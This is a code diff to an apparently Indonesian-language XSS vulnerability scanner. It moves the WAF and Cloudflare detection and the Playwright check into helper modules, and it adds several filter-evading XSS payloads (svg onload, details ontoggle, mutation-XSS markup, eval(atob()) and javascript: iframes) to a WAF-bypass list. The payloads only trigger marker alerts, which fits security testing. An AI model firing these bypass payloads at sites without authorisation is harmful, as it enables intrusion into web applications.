@@ -8,6 +8,8 @@ from urllib.parse import urljoin, quote, urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from helpers.http_client import HttpClient
+from helpers.waf_checker import WAFChecker
+from helpers.spa_crawler import SPACrawler
 from helpers.parsers import (
     extract_forms,
     extract_all_js_paths,
@@ -16,12 +18,6 @@ from helpers.parsers import (
 )
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-try:
-    from playwright.sync_api import sync_playwright
-    PLAYWRIGHT_AVAILABLE = True
-except ImportError:
-    PLAYWRIGHT_AVAILABLE = False
 
 
 # ── Terminal output helpers ───────────────────────────────────────────────────
@@ -45,11 +41,7 @@ JSON_HEADERS = {
     'X-Requested-With': 'XMLHttpRequest',
 }
 
-CLOUDFLARE_SIGNATURES = [
-    'cloudflare', 'cf-ray', 'just a moment',
-    'checking your browser', 'cdn-cgi',
-    'enable javascript', 'ddos protection',
-]
+# CLOUDFLARE_SIGNATURES sudah dimigrasikan ke helpers/waf_checker.py
 
 
 # ── Payloads ──────────────────────────────────────────────────────────────────
@@ -77,6 +69,16 @@ WAF_BYPASS_PAYLOADS = [
     f'%3Cscript%3Ealert%28%22{XSS_MARKER}%22%29%3C%2Fscript%3E',
     f'<scr%00ipt>alert("{XSS_MARKER}")</scr%00ipt>',
     f'<img src=x onerror=&#97;lert("{XSS_MARKER}")>',
+    # Tambahan WAF bypass payloads
+    f'<svg/onload=alert("{XSS_MARKER}")>',
+    f'<details/open/ontoggle=alert("{XSS_MARKER}")>',
+    f'<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert("{XSS_MARKER}")>',
+    f'<img src=x onerror="eval(atob(\'YWxlcnQo\'))" />',
+    f'<iframe src="javascript:alert(`{XSS_MARKER}`)" />',
+    f'<input onfocus=alert("{XSS_MARKER}") autofocus>',
+    f'<marquee onstart=alert("{XSS_MARKER}")>',
+    f'"><img/src=x onerror=alert("{XSS_MARKER}")>',
+    f'"><svg/onload=confirm("{XSS_MARKER}")>',
 ]
 
 TEST_ENDPOINTS = [
@@ -157,6 +159,7 @@ class XSSChecker:
         self._vuln_found = threading.Event()
         self._found_keys: set = set()
         self._waf_detected    = False
+        self._waf_info: Dict  = {}
         self._api_bases: List = []
 
         self._client = HttpClient(
@@ -170,21 +173,13 @@ class XSSChecker:
     # ── Utils ─────────────────────────────────────────────────────────────────
 
     def _is_cloudflare_page(self, text: str) -> bool:
-        return any(sig in text.lower() for sig in CLOUDFLARE_SIGNATURES)
+        return WAFChecker.is_cloudflare_page(text)
 
     def _detect_waf(self) -> bool:
-        r = self._client.get(
-            f"{self.base_url}/?x=<script>alert(1)</script>",
-            headers=HEADERS
-        )
-        if not r:
-            return False
-        waf_headers = {'cf-ray', 'x-sucuri-id', 'x-firewall', 'x-waf'}
-        if waf_headers & {k.lower() for k in r.headers.keys()}:
-            return True
-        if self._is_cloudflare_page(r.text):
-            return True
-        return r.status_code == 403
+        waf = WAFChecker(self.base_url, self._client, HEADERS)
+        detected = waf.detect()
+        self._waf_info = waf.get_info()
+        return detected
 
     def _is_reflected(self, body: str, payload: str, content_type: str = '') -> bool:
         if XSS_MARKER not in body:
@@ -450,8 +445,10 @@ class XSSChecker:
         try:
             self._waf_detected      = self._detect_waf()
             results['waf_detected'] = self._waf_detected
-            waf_status = "terdeteksi" if self._waf_detected else "tidak terdeteksi"
-            pw_status  = "tersedia"   if PLAYWRIGHT_AVAILABLE else "tidak tersedia"
+            results['waf_info']     = self._waf_info
+            waf_name   = self._waf_info.get('waf_name', '?')
+            waf_status = f"terdeteksi ({waf_name})" if self._waf_detected else "tidak terdeteksi"
+            pw_status  = "tersedia" if SPACrawler.is_available() else "tidak tersedia"
             _info(f"WAF: {waf_status} | Playwright: {pw_status}")
 
             _step(1, 3, "Mengumpulkan endpoint ...")
